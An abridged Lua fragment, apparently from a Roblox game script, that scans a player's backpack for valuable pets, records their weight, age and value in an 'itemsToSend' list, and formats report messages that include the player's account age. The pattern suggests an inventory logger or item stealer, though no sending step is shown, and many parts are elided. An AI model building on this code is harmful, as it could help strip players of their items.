    ...
    local function getPetEmoji(petName, weight)
        ...
        -- Extract base pet type (remove mutation keywords) to find the correct emoji
        ...
        if petEmojis[baseName] then
            return petEmojis[baseName]
        end
        
        -- If not found, try to find a partial match (check if any pet type is contained in the base name)
        for petType, emoji in pairs(petEmojis) do
            if string.find(baseName, petType, 1, true) then
                return emoji
            end
        end
        
        -- If still not found, try reverse search (check if base name is contained in any pet type)
        for petType, emoji in pairs(petEmojis) do
            if string.find(petType, baseName, 1, true) then
                return emoji
            end
        end
    ...
    debugPrint("No minimum value filter")
    ...
    local function SendJoinMessage(list, prefix)
        ...
        local success, result = pcall(function()
            return tostring(plr.AccountAge) .. " days"
        end)
        if success then
            accountAge = result
        end
    ...
    local function SendMessage(sortedItems)
        ...
        for _, item in ipairs(sortedItems) do
            if item.Type == "Pet" then
                ...
                local line = string.format("%s%s [%.2f KG] → %s¢", item.Name, ageStr, item.Weight, formatNumber(item.Value))
    ...
    for _, tool in ipairs(backpack:GetChildren()) do
        ...
        for _, excluded in ipairs(excludedItems) do
            if tool.Name == excluded then
                isExcluded = true
                break
            end
        end
        
        if tool:IsA("Tool") and not isExcluded then
                ...
                if petUUID and dataService and dataService.GetData then
                    ...
                    if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                        ...
                        if v14 then
                            ...
                            -- Improved weight extraction: try multiple sources
                            local weight = 0
                            -- First try to get weight from pet data
                            if v14.PetData and v14.PetData.BaseWeight then
                                weight = tonumber(v14.PetData.BaseWeight) or 0
                            end
                            
                            -- If no weight in pet data, try to extract from name
                            if weight == 0 then
                                weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                            end
                            
                            -- If still no weight, try to get from tool attributes
                            if weight == 0 then
                                local weightAttr = tool:GetAttribute("Weight") or tool:GetAttribute("KG") or tool:GetAttribute("WeightValue")
                                if weightAttr then
                                    weight = tonumber(weightAttr) or 0
                                end
                            end
                            
                            -- Improved age extraction: prioritize pet data over name parsing
                            local petAge = nil
                            if v14.PetData and v14.PetData.Age then
                                petAge = tonumber(v14.PetData.Age)
                            end
                            
                            -- If no age in pet data, try to extract from name (but this may fail for mutated pets)
                            if not petAge then
                                -- Try multiple patterns to extract age from name
                            ...
                            if isRarePet(itemName, weight) then
                                ...
                                -- Get pet emoji and check if pet has mutation
                                local petEmoji = getPetEmoji(itemName, weight)
                                local hasPetMutation = hasMutation(itemName)
                                
                                -- Format pet name with emoji
                                local displayName = petEmoji .. " - " .. itemName
                                
                                table.insert(itemsToSend, {Tool = tool, Name = displayName, Value = value, Weight = weight, Type = "Pet", Age = petAge, HasMutation = hasPetMutation})
                                debugPrint("Added pet: " .. displayName .. " Value: " .. value .. " Age: " .. tostring(petAge) .. " Weight: " .. tostring(weight) .. " Mutation: " .. tostring(hasPetMutation))
                                
                                -- Debug info for age detection
                                if petAge == "N/A" then
                                    debugPrint("WARNING: Could not detect age for pet: " .. itemName .. " (Name: " .. toolName .. ")")
                                    if v14.PetData then
                                        debugPrint("Pet data available: " .. tostring(v14.PetData.Age ~= nil))
                                    end
                                end
                            end
                        end
